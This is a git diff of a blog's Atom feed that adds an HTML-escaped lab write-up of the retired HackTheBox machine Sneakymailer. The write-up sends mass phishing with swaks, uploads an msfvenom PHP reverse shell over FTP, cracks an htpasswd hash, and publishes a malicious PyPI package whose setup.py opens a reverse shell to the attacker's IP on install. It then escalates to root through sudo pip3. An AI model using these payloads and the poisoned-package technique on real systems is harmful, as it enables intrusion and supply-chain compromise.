@@ -1,5 +1,271 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-11-22T12:41:00+01:00</updated><entry><title>HTB: Buff</title><link href="https://maggick.fr/2020/11/htb-buff.html" rel="alternate"></link><published>2020-11-22T12:41:00+01:00</published><updated>2020-11-22T12:41:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-11-22:/2020/11/htb-buff.html</id><summary type="html">&lt;p&gt;&lt;img alt="Buff card" class="align-left" src="/media/2020.11/buff_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-12-03T07:20:00+01:00</updated><entry><title>HTB: Sneakymailer</title><link href="https://maggick.fr/2020/12/htb-sneakymailer.html" rel="alternate"></link><published>2020-12-03T07:20:00+01:00</published><updated>2020-12-03T07:20:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-12-03:/2020/12/htb-sneakymailer.html</id><summary type="html">&lt;p&gt;&lt;img alt="Sneakymailer Card" class="align-left" src="/media/2020.12/sneakymailer_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/262"&gt;Sneakymailer&lt;/a&gt; publish on
+July 11, 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/106709"&gt;sulcud&lt;/a&gt;.
+This box is rated as a medium box. It implies some phishing, an IMAP server, a
+FTP server, Pypi and sudo.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.12/sneakymailer_card.png" alt="Sneakymailer Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/262"&gt;Sneakymailer&lt;/a&gt; publish on
+July 11, 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/106709"&gt;sulcud&lt;/a&gt;.
+This box is rated as a medium box. It implies some phishing, an IMAP server, a
+FTP server, Pypi and sudo.&lt;/p&gt;
+
+
+&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Jul 25 03:42:58 2020 as: nmap -p- -sSV -oN nmap 10.10.10.197&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.197&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.079s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65528 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT     STATE SERVICE  VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;21/tcp   open  ftp      vsftpd 3.0.3&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;25/tcp   open  smtp     Postfix smtpd&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp   open  http     nginx 1.14.2&lt;/span&gt;
+&lt;span class="code-line"&gt;143/tcp  open  imap     Courier Imapd (released 2018)&lt;/span&gt;
+&lt;span class="code-line"&gt;993/tcp  open  ssl/imap Courier Imapd (released 2018)&lt;/span&gt;
+&lt;span class="code-line"&gt;8080/tcp open  http     nginx 1.14.2&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;There is a few open ports:
+* 21 FTP
+* 22 SSH
+* 25 SMTPD (email)
+* 80 Nginx (web)
+* 143 imap (mail)
+* 993 imap/ssl (mail)
+* 8080 nginx (mail)&lt;/p&gt;
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;When browsing the website we notice a list of email addresses. We copy them to a
+file an use &lt;code&gt;cut -f 4&lt;/code&gt; to get a proper list with the email only.&lt;/p&gt;
+&lt;p&gt;Nothing else on the website seems of interest.&lt;/p&gt;
+&lt;h2 id="phishing"&gt;Phishing&lt;/h2&gt;
+&lt;p&gt;As the port 25 is open, we can send email to the server.
+Our phishing email will contain a simple
+link to our machine &lt;code&gt;http://10.10.14.11:8080/test&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Hey try that:&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;http://10.10.14.11:8000/test&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;HF&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We use &lt;a href="https://github.com/jetmore/swaks"&gt;swaks&lt;/a&gt;
+in order to automatically send our phishing email:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;while read l; do swaks --to $l --server 10.10.10.197 --body email; done &amp;lt;emails&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We run a &lt;code&gt;netcat&lt;/code&gt; listener on port 8080 in order to see the incoming requests and
+got some POST request containing a username and a password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -l -p 8000&lt;/span&gt;
+&lt;span class="code-line"&gt;POST /test%0D HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: 10.10.14.11:8000&lt;/span&gt;
+&lt;span class="code-line"&gt;User-Agent: python-requests/2.23.0&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept: */*&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: keep-alive&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 185&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;firstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd%40sneakymailer.htb&amp;amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="evolution"&gt;Evolution&lt;/h2&gt;
+&lt;p&gt;It took me quit a long time to understand what these credentials where for. But
+as the IMAP port is open we can connect to it with a mail client. We launch
+evolution (already installed on Kali Linux) and configure it with the previous
+information (note that the user is &lt;code&gt;paulbyrd&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;We found two emails in the &lt;code&gt;sent&lt;/code&gt; directory. The first on contain a password for
+the &lt;code&gt;developer&lt;/code&gt; account.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Hello administrator, I want to change this password for the developer account&lt;/p&gt;
+&lt;p&gt;Username: developer
+Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&lt;/p&gt;
+&lt;p&gt;Please notify me when you do it&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The second one is a address to &lt;code&gt;low&lt;/code&gt; and give us some hint about one of the next step.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Hello low&lt;/p&gt;
+&lt;p&gt;Your current task is to install, test and then erase every python module you
+find in our PyPI service, let me know if you have any inconvenience.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id="ftp"&gt;FTP&lt;/h2&gt;
+&lt;p&gt;The &lt;code&gt;developer&lt;/code&gt; account credentials allow us to connect to the FTP service. We
+see that we can write on the &lt;code&gt;dev&lt;/code&gt; folder.&lt;/p&gt;
+&lt;p&gt;This also take me some time to figure out but we can access our uploaded file on
+the &lt;code&gt;dev&lt;/code&gt; environment accessible at &lt;a href="http://dev.sneakycorp.htb/test"&gt;http://dev.sneakycorp.htb/test&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Therefore we generate a simple PHP &lt;code&gt;meterpreter&lt;/code&gt; using &lt;code&gt;msfvenom&lt;/code&gt;: &lt;code&gt;msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw &amp;gt; lol.php&lt;/code&gt;
+and upload it on the FTP server.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;write on ftp dev (webshell)&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~$ ftp 10.10.10.197&lt;/span&gt;
+&lt;span class="code-line"&gt;Connected to 10.10.10.197.&lt;/span&gt;
+&lt;span class="code-line"&gt;220 (vsFTPd 3.0.3)&lt;/span&gt;
+&lt;span class="code-line"&gt;Name (10.10.10.197:kali): developer&lt;/span&gt;
+&lt;span class="code-line"&gt;331 Please specify the password.&lt;/span&gt;
+&lt;span class="code-line"&gt;Password:&lt;/span&gt;
+&lt;span class="code-line"&gt;230 Login successful.&lt;/span&gt;
+&lt;span class="code-line"&gt;ftp&amp;gt; cd dev&lt;/span&gt;
+&lt;span class="code-line"&gt;250 Directory successfully changed.&lt;/span&gt;
+&lt;span class="code-line"&gt;ftp&amp;gt; put lol.php&lt;/span&gt;
+&lt;span class="code-line"&gt;local: lol.php remote: lol.php&lt;/span&gt;
+&lt;span class="code-line"&gt;200 PORT command successful. Consider using PASV.&lt;/span&gt;
+&lt;span class="code-line"&gt;150 Ok to send data.&lt;/span&gt;
+&lt;span class="code-line"&gt;226 Transfer complete.&lt;/span&gt;
+&lt;span class="code-line"&gt;30687 bytes sent in 0.00 secs (7.3772 MB/s)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We run the &lt;code&gt;metasploit&lt;/code&gt; handler and trigger our payload by browsing to &lt;a href="http://dev.sneakycorp.htb/lol.php"&gt;http://dev.sneakycorp.htb/lol.php&lt;/a&gt;.
+This get us a shell as &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; getuid&lt;/span&gt;
+&lt;span class="code-line"&gt;Server username: www-data (33)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="john"&gt;John&lt;/h2&gt;
+&lt;p&gt;We browse the file system and found some &lt;code&gt;pypi&lt;/code&gt; sub domain and a &lt;code&gt;.htpasswd&lt;/code&gt; file
+containing an encrypted password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; ls&lt;/span&gt;
+&lt;span class="code-line"&gt;Listing: /var/www/pypi.sneakycorp.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;=====================================&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Mode              Size  Type  Last modified              Name&lt;/span&gt;
+&lt;span class="code-line"&gt;----              ----  ----  -------------              ----&lt;/span&gt;
+&lt;span class="code-line"&gt;100644/rw-r--r--  43    fil   2020-05-15 14:29:53 -0400  .htpasswd&lt;/span&gt;
+&lt;span class="code-line"&gt;40770/rwxrwx---   4096  dir   2020-08-07 07:12:52 -0400  packages&lt;/span&gt;
+&lt;span class="code-line"&gt;40755/rwxr-xr-x   4096  dir   2020-05-14 18:25:43 -0400  venv&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;meterpreter &amp;gt; cat .htpasswd&lt;/span&gt;
+&lt;span class="code-line"&gt;pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We run &lt;code&gt;john&lt;/code&gt; and the &lt;code&gt;rockyou&lt;/code&gt; dictionary on it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ john hash -w=~/tools/password_lists/rockyou.txt --fork=8&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;md5crypt&amp;quot;, but the string is also recognized as &amp;quot;md5crypt-long&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the &amp;quot;--format=md5crypt-long&amp;quot; option to force loading these as that type instead&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;md5crypt&amp;quot;, but the string is also recognized as &amp;quot;md5crypt-opencl&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the &amp;quot;--format=md5crypt-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
+&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: OpenMP was disabled due to --fork; a non-OpenMP build may be faster&lt;/span&gt;
+&lt;span class="code-line"&gt;Node numbers 1-8 of 8 (fork)&lt;/span&gt;
+&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
+&lt;span class="code-line"&gt;4 0g 0:00:00:05 5.58% (ETA: 14:16:12) 0g/s 19731p/s 19731c/s 19731C/s jeanix..jbhunt&lt;/span&gt;
+&lt;span class="code-line"&gt;soufianeelhaoui  (pypi)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="pypi"&gt;PyPi&lt;/h2&gt;
+&lt;p&gt;This new credentials set allows us to access the &lt;a href="https://pypi.org/"&gt;PyPi&lt;/a&gt;
+server located at
+&lt;a href="http://pypi.sneakycorp.htb:8080/"&gt;http://pypi.sneakycorp.htb:8080/&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I had never made a Python package, neither use that in order to get a reverse
+shell. A read a few &lt;a href="https://medium.com/@joel.barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56"&gt;article about make and uploading package to pypi&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We then construct a specific package with a reverse shell code in &lt;code&gt;setup.py&lt;/code&gt;.
+The structure of the package is the following.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;package&lt;/span&gt;
+&lt;span class="code-line"&gt;├── build&lt;/span&gt;
+&lt;span class="code-line"&gt;│   └── lib.linux-x86_64-2.7&lt;/span&gt;
+&lt;span class="code-line"&gt;│       └── plop&lt;/span&gt;
+&lt;span class="code-line"&gt;│           ├── __init__.py&lt;/span&gt;
+&lt;span class="code-line"&gt;│           └── plop.py&lt;/span&gt;
+&lt;span class="code-line"&gt;├── dist&lt;/span&gt;
+&lt;span class="code-line"&gt;│   └── plop-0.3.tar.gz&lt;/span&gt;
+&lt;span class="code-line"&gt;├── LICENSE.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;├── MANIFEST&lt;/span&gt;
+&lt;span class="code-line"&gt;├── plop&lt;/span&gt;
+&lt;span class="code-line"&gt;│   ├── __init__.py&lt;/span&gt;
+&lt;span class="code-line"&gt;│   └── plop.py&lt;/span&gt;
+&lt;span class="code-line"&gt;├── plop.egg-info&lt;/span&gt;
+&lt;span class="code-line"&gt;│   ├── dependency_links.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;│   ├── PKG-INFO&lt;/span&gt;
+&lt;span class="code-line"&gt;│   ├── SOURCES.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;│   └── top_level.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;├── README&lt;/span&gt;
+&lt;span class="code-line"&gt;├── setup.cfg&lt;/span&gt;
+&lt;span class="code-line"&gt;└── setup.py&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The code in &lt;code&gt;setup.py&lt;/code&gt; is:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;setuptools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;setup&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pty&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;setuptools.command.install&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;getpass&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://10.10.14.11:8000/boom&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;getpass&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getuser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;kali&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;10.10.14.11&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dup2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fileno&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;&lt;span class="n"&gt;pty&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;plop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;         &lt;span class="c1"&gt;# How you named your package folder (MyLib)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="n"&gt;packages&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;plop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;   &lt;span class="c1"&gt;# Chose the same as &amp;quot;name&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="n"&gt;version&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0.3&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;      &lt;span class="c1"&gt;# Start with a small number and increase it with every change you make&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="n"&gt;license&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;MIT&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;        &lt;span class="c1"&gt;# Chose a license from here: https://help.github.com/articles/licensing-a-repository&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="n"&gt;cmdclass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;install&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;CustomInstall&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We build our package with &lt;code&gt;python setup.py sdist&lt;/code&gt; and upload it to the PyPi
+server with &lt;code&gt;twine&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;twine upload --repository-url http://pypi.sneakycorp.htb:8080/ dist/* --verbose&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;At the same time we run a &lt;code&gt;netcat&lt;/code&gt; listener on our Kali box and wait for the
+shell. We then have a shell as &lt;code&gt;low&lt;/code&gt; and can access the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -l -p 4444&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;$ cat ~/user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;cat ~/user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;73592699b63e47969c6de934654c2325&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;We put our ssh public key in the &lt;code&gt;.ssh/authorized_keys&lt;/code&gt; file and connect to the
+box using SSH and run &lt;code&gt;sudo -l&lt;/code&gt;. We found that we can run &lt;code&gt;pip3&lt;/code&gt; as root without
+password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh low@10.10.10.197&lt;/span&gt;
+&lt;span class="code-line"&gt;low@sneakymailer:~$ sudo -l&lt;/span&gt;
+&lt;span class="code-line"&gt;^C^C^Csudo: unable to resolve host sneakymailer: Temporary failure in name resolution&lt;/span&gt;
+&lt;span class="code-line"&gt;Matching Defaults entries for low on sneakymailer:&lt;/span&gt;
+&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;User low may run the following commands on sneakymailer:&lt;/span&gt;
+&lt;span class="code-line"&gt;    (root) NOPASSWD: /usr/bin/pip3&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We look at the &lt;a href="https://gtfobins.github.io/gtfobins/pip/#sudo"&gt;GTFObins page for pip&lt;/a&gt;
+and run the commands to create a temporary directory, write a simple &lt;code&gt;setup.py&lt;/code&gt;
+script executing a shell and installing this "script" as root which give us a
+&lt;code&gt;root&lt;/code&gt; shell and allow us to read the &lt;code&gt;root&lt;/code&gt; flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;low@sneakymailer:~$ TF=$(mktemp -d)&lt;/span&gt;
+&lt;span class="code-line"&gt;low@sneakymailer:~$ echo &amp;quot;import os; os.execl(&amp;#39;/bin/sh&amp;#39;, &amp;#39;sh&amp;#39;, &amp;#39;-c&amp;#39;, &amp;#39;sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&amp;#39;)&amp;quot; &amp;gt; $TF/setup.py&lt;/span&gt;
+&lt;span class="code-line"&gt;low@sneakymailer:~$ sudo /usr/bin/pip3 install $TF&lt;/span&gt;
+&lt;span class="code-line"&gt;sudo: unable to resolve host sneakymailer: Temporary failure in name resolution&lt;/span&gt;
+&lt;span class="code-line"&gt;Processing /tmp/tmp.FVBLBZ1NUO&lt;/span&gt;
+&lt;span class="code-line"&gt;# id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
+&lt;span class="code-line"&gt;# cat /root/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;3d8f51cb4506c19d77aea84d76e6a846&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;The root part was really classic and easy. The user part was awesome! I learn so
+much on this box and the conception is clearly different from classical boxes as
+their is a lot of "interaction" with the "users" (phishing, pypi).&lt;/p&gt;
